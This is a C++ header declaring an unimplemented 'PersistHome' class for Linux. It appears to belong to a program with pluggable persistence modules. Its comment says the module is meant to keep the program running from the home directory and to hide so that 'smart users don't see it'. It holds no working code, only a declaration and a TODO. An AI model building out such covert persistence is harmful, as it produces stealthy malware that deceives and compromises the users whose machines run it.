#pragma once
#include <Common.h>
// Supports linux only
#ifdef CHARLIE_LINUX
#define CHARLIE_USE_METHOD
#include <Logging.h>
#include "../../PersistInter.h"
#include "../../PersistMethod.h"

/*
 * Persist Home
 * ============
 *
 * OS: Linux
 * Uses various methods to make sure the program is run in the home directory.
 * Tries to hide a bit so that smart users don't see it.
 *
 * TODO: IMPLEMENT THIS
 */
namespace modules
{
  namespace persist
  {
    class PersistHome : public PersistMethod
    {
    public:
      PersistHome();
      ~PersistHome();

      void init(ModuleInterface *inter, PersistModule* persist);

    private:
      ModuleInterface* inter;
      PersistModule* persist;
    };
  };
};
#endif
